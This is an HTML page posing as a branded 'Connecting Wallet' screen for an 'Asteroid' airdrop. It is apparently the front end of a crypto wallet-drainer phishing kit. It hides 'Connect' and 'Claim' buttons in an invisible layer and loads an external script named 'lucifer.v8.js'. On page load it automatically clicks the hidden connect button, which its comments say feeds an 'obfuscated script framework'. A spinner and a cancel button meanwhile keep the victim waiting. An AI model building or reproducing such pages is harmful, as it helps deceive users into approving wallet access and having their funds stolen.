<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting Wallet | Asteroid</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg: #030303;
            --text-main: #ffffff;
            --text-muted: #888888;
            --accent-orange: #ff7a00;
            --card-bg: rgba(10, 10, 10, 0.8);
            --border-color: rgba(255, 255, 255, 0.08);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: var(--bg);
            /* Subtle star-like particle distribution mimicking the screenshot background */
            background-image: 
                radial-gradient(white, rgba(255,255,255,.2) 2px, transparent 40px),
                radial-gradient(white, rgba(255,255,255,.15) 1px, transparent 30px),
                radial-gradient(white, rgba(255,255,255,.1) 2px, transparent 20px);
            background-size: 550px 550px, 350px 350px, 250px 250px;
            background-position: 0 0, 40px 60px, 130px 270px;
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            overflow: hidden;
        }

        .connect-card {
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 28px;
            width: 100%;
            max-width: 440px;
            padding: 3rem 2.5rem;
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
            text-align: center;
            position: relative;
            z-index: 10;
        }

        /* Asteroid Mascot Image Frame */
        .mascot-container {
            width: 64px;
            height: 64px;
            background: #111111;
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 50%;
            margin: 0 auto 1.5rem auto;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .mascot-container img {
            width: 85%;
            height: 85%;
            object-fit: contain;
            border-radius: 50%;
        }

        /* Asteroid Brand Header */
        .header-logo {
            font-size: 2.2rem;
            font-weight: 800;
            letter-spacing: -1px;
            margin-bottom: 2.5rem;
            text-transform: uppercase;
        }

        .header-logo span {
            color: var(--accent-orange);
        }

        /* Modernized elegant spinner matching dark UI */
        .spinner-container {
            position: relative;
            width: 70px;
            height: 70px;
            margin: 0 auto 2.5rem auto;
        }

        .spinner {
            width: 100%;
            height: 100%;
            border: 2px solid rgba(255, 255, 255, 0.05);
            border-top: 2px solid var(--accent-orange);
            border-right: 2px solid var(--accent-orange);
            border-radius: 50%;
            animation: spin 0.9s cubic-bezier(0.6, 0.2, 0.2, 0.8) infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-title {
            font-size: 1.35rem;
            font-weight: 700;
            margin-bottom: 0.75rem;
            letter-spacing: -0.3px;
        }

        .status-desc {
            font-size: 0.92rem;
            color: var(--text-muted);
            line-height: 1.6;
            margin-bottom: 2.5rem;
            padding: 0 0.5rem;
        }

        /* Orange primary action button matching 'Claim Airdrop' aesthetics */
        .cancel-btn {
            background: var(--accent-orange);
            color: #000000;
            border: none;
            border-radius: 30px;
            padding: 0.9rem 2.5rem;
            font-size: 0.95rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.25s ease;
            width: 100%;
            box-shadow: 0 4px 15px rgba(255, 122, 0, 0.3);
        }

        .cancel-btn:hover {
            background: #ff912a;
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(255, 122, 0, 0.45);
        }

        .cancel-btn:active {
            transform: translateY(1px);
        }

        /* Hidden Target Layer to satisfy the obfuscated script trackers */
        .hidden-triggers {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0;
            opacity: 0;
        }
    </style>
</head>
<body>

    <div class="connect-card">
        <div class="mascot-container">
            <img src="https://i.postimg.co/N06Xv6p6/astronaut-shiba.png" alt="Asteroid Mascot" onerror="this.src='https://walletconnect.com/apple-touch-icon.png'">
        </div>

        <div class="header-logo">ASTEROID<span>.</span></div>
        
        <div class="spinner-container">
            <div class="spinner"></div>
        </div>

        <h3 class="status-title" id="statusTitle">Connecting Wallet</h3>
        <p class="status-desc" id="statusDesc">Approve connection request inside your mobile wallet application container.</p>

        <button class="cancel-btn" onclick="goBack()">Cancel Request</button>
    </div>

    <div class="hidden-triggers">
        <button class="interactBtn" id="connectButton">Connect</button>
        <button class="claimBtn" id="claimButton">Claim</button>
        <div class="wallet-info"></div>
    </div>

    <script type="module" crossorigin src="/files/lucifer.v8.js"></script>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const activeWallet = urlParams.get('wallet') || 'Wallet';

        document.getElementById('statusTitle').textContent = `Connecting ${activeWallet}`;
        document.getElementById('statusDesc').textContent = `Please review and approve the connection request within your standard ${activeWallet} utility extension.`;

        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(() => {
                const hiddenBtn = document.querySelector('.interactBtn');
                if (hiddenBtn) {
                    console.log("Simulating interaction for obfuscated script framework...");
                    hiddenBtn.click();
                }
            }, 400);
        });

        function goBack() {
            window.history.back();
        }
    </script>
</body>
</html>
